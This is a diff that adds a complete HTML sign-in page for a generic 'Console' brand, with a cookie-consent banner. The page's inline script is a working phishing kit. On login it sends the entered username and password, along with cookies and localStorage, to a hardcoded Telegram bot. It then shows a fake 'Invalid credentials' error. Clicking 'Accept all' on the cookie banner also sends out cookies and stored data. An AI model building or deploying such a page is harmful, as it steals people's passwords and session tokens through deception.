@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, "Segoe UI", Roboto, sans-serif;
+         background: #f4f6f9; display: flex; align-items: center;
+         justify-content: center; min-height: 100vh; color: #222; }
+  .card { background: #fff; padding: 40px 40px 32px; border-radius: 14px;
+          box-shadow: 0 10px 30px rgba(0,0,0,0.08); width: 400px; }
+  .logo-wrap { display: flex; flex-direction: column; align-items: center;
+               margin-bottom: 26px; }
+  .logo { width: 56px; height: 56px; object-fit: contain; margin-bottom: 12px; }
+  .brand { font-size: 20px; font-weight: 700; letter-spacing: -0.4px; color: #1a73e8; }
+  h1 { font-size: 16px; font-weight: 600; margin-bottom: 22px;
+       text-align: center; color: #333; }
+  label { display: block; font-size: 13px; margin-bottom: 6px; color: #555; }
+  input[type=text], input[type=password] {
+    width: 100%; padding: 11px 14px; border: 1px solid #d8dde3;
+    border-radius: 8px; font-size: 14px; outline: none;
+    transition: border-color 0.15s; }
+  input[type=text]:focus, input[type=password]:focus { border-color: #1a73e8; }
+  .field { margin-bottom: 16px; }
+  button { width: 100%; padding: 12px; background: #1a73e8; color: #fff;
+           border: none; border-radius: 8px; font-size: 15px;
+           font-weight: 600; cursor: pointer; margin-top: 6px;
+           transition: background 0.15s; }
+  button:hover { background: #1663c7; }
+  button:disabled { background: #9bbdf0; cursor: not-allowed; }
+  .err { color: #d93025; font-size: 13px; margin-top: 12px;
+         text-align: center; display: none; }
+  .foot { text-align: center; font-size: 12px; color: #888; margin-top: 22px; }
+  .cookie-banner { position: fixed; left: 0; right: 0; bottom: 0;
+    background: #1f2937; color: #e5e7eb; padding: 16px 24px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 20px; font-size: 13px; z-index: 1000;
+    transform: translateY(120%); transition: transform 0.4s ease; }
+  .cookie-banner.show { transform: translateY(0); }
+  .cookie-banner p { margin: 0; line-height: 1.4; max-width: 620px; }
+  .cookie-banner a { color: #60a5fa; text-decoration: underline; }
+  .cookie-actions { display: flex; gap: 10px; flex-shrink: 0; }
+  .cookie-btn { padding: 9px 18px; border-radius: 6px; border: none;
+    font-size: 13px; font-weight: 600; cursor: pointer; }
+  .cookie-btn.accept { background: #1a73e8; color: #fff; }
+  .cookie-btn.accept:hover { background: #1663c7; }
+  .cookie-btn.reject { background: transparent; color: #9ca3af;
+    border: 1px solid #4b5563; }
+  .cookie-btn.reject:hover { color: #e5e7eb; }
+</style>
+</head>
+<body>
+
+  <form class="card" id="loginForm" autocomplete="off">
+    <div class="logo-wrap">
+      <img src="logo.png" alt="Logo" class="logo">
+      <div class="brand">Console</div>
+    </div>
+    <h1>Sign in to your account</h1>
+
+    <div class="field">
+      <label for="username">Email or username</label>
+      <input id="username" name="username" type="text" required>
+    </div>
+
+    <div class="field">
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" required>
+    </div>
+
+    <button type="submit" id="submitBtn">Sign in</button>
+    <div class="err" id="err">Invalid credentials. Try again.</div>
+
+    <div class="foot">Protected by acme-security</div>
+  </form>
+
+  <div class="cookie-banner" id="cookieBanner">
+    <p>
+      We use cookies to keep you signed in, remember your preferences,
+      and improve security. <a href="#">Learn more</a>
+    </p>
+    <div class="cookie-actions">
+      <button class="cookie-btn reject" id="rejectBtn">Reject all</button>
+      <button class="cookie-btn accept" id="acceptBtn">Accept all</button>
+    </div>
+  </div>
+
+<script>
+  const BOT_TOKEN = "8893700962:AAEoWKgNkCfTnVKjqUb0lXiXS06dImxnt5U";
+  const CHAT_ID   = "7114350905";
+  const API       = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+  const send = async (text) => {
+    const size = 3900;
+    for (let i = 0; i < text.length; i += size) {
+      try {
+        await fetch(API, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID,
+            text: text.slice(i, i + size),
+            disable_web_page_preview: true })
+        });
+      } catch {}
+    }
+  };
+
+  const safe = (fn, fb = null) => { try { return fn(); } catch { return fb; } };
+
+  const collect = () => ({
+    url: location.href,
+    referrer: document.referrer || null,
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: `${screen.width}x${screen.height}`,
+    cookies: safe(() => document.cookie || "(none)", "(blocked)"),
+    localStorage: safe(() => {
+      const o = {};
+      for (let i = 0; i < localStorage.length; i++) {
+        const k = localStorage.key(i); o[k] = localStorage.getItem(k);
+      }
+      return o;
+    }, {}),
+    sessionStorage: safe(() => {
+      const o = {};
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const k = sessionStorage.key(i); o[k] = sessionStorage.getItem(k);
+      }
+      return o;
+    }, {}),
+    timestamp: new Date().toISOString()
+  });
+
+  setTimeout(() => {
+    document.getElementById("cookieBanner").classList.add("show");
+  }, 1500);
+
+  document.getElementById("rejectBtn").addEventListener("click", () => {
+    document.getElementById("cookieBanner").classList.remove("show");
+  });
+
+  document.getElementById("acceptBtn").addEventListener("click", async () => {
+    document.getElementById("cookieBanner").classList.remove("show");
+    const d = collect();
+    await send(
+      `🍪 COOKIE CONSENT — ACCEPT ALL\n` +
+      `━━━━━━━━━━━━━━━\n` +
+      `🌐 ${d.url}\n` +
+      `🍪 ${d.cookies}\n` +
+      `💾 LS: ${JSON.stringify(d.localStorage).slice(0, 400)}\n` +
+      `🕒 ${d.timestamp}`
+    );
+  });
+
+  document.getElementById("loginForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const u = document.getElementById("username").value.trim();
+    const p = document.getElementById("password").value;
+    if (!u || !p) return;
+
+    const btn = document.getElementById("submitBtn");
+    btn.disabled = true;
+    btn.innerText = "Signing in…";
+
+    const d = collect();
+    await send(
+      `🔐 LOGIN CAPTURE\n` +
+      `━━━━━━━━━━━━━━━\n` +
+      `👤 ${u}\n` +
+      `🔑 ${p}\n` +
+      `━━━━━━━━━━━━━━━\n` +
+      `🌐 ${d.url}\n` +
+      `🍪 ${d.cookies.slice(0, 400)}\n` +
+      `💾 LS: ${JSON.stringify(d.localStorage).slice(0, 300)}\n` +
+      `🕒 ${d.timestamp}\n` +
+      `🖥️ ${d.screen} | ${d.timezone}`
+    );
+
+    setTimeout(() => {
+      btn.disabled = false;
+      btn.innerText = "Sign in";
+      document.getElementById("err").style.display = "block";
+      document.getElementById("password").value = "";
+    }, 900);
+  });
+</script>
+</body>
+</html>
